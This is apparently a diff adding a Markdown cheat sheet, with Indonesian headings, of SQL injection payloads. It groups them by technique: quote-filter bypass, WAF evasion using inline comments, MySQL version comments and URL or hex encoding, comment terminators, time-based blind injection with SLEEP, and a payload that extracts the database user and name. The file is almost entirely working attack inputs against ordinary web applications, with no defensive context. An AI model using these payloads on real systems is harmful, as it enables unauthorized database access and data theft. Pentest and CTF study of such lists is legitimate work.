@@ -1,0 +1,40 @@
+
+## 🔹 Bypass Filter Petik (' atau ")
+1 OR 1=1
+1 OR TRUE
+1 OR 1 LIKE 1
+1 OR 1=1-- -
+1 OR 1=1#
+
+## 🔹 Bypass WAF / Obfuscation Kata Kunci
+1/**/OR/**/1=1
+1%09OR%091=1
+1 /*!50000UNION*/ /*!50000SELECT*/ 1,2#
+1 OR (SELECT/**/1)=1
+1 OR 1 GROUP BY CONCAT_WS(0x3a,user(),database())#
+
+## 🔹 Bypass Komentar
+*untuk tahap awal ini sngat penting
+1--+
+1-- -
+1%23
+1%2D%2D+
+
+## 🔹 Blind SQLi / Time-Based
+1' AND SLEEP(3)-- -
+1 AND IF(1=1,SLEEP(3),0)#
+1 AND (SELECT 1 FROM dual WHERE 1=1 AND SLEEP(5))--
+
+## 🔹 Bypass Parameter Sanitization
+1/**/OR/**/1=1
+1%2f**%2fOR%2f**%2f1=1
+
+## 🔹 Payload Unik dari Write-Up
+# Menggunakan komentar inline
+1'/**/OR/**/1=1#
+# Menggunakan encoding hex
+1%4F%52%20%31%3D%31
+# Menggunakan teknik obfuscation
+1 /*!00000OR*/ 1=1
+# Menggunakan teknik time-based dengan fungsi IF
+1 AND IF(1=1,SLEEP(3),0)#
